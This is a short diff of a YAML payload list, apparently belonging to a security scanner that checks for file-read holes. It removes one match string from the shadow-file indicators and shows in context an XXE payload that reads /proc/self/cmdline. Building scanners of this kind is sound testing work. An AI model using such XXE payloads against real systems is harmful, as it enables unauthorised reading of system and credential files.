@@ -81,7 +81,6 @@ file_read_payloads:
     - generic
     - - "root:"
       - "$6$"
-      - "!"
   - - cmdline_read
     - '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">]><root>&xxe;</root>'
     - generic
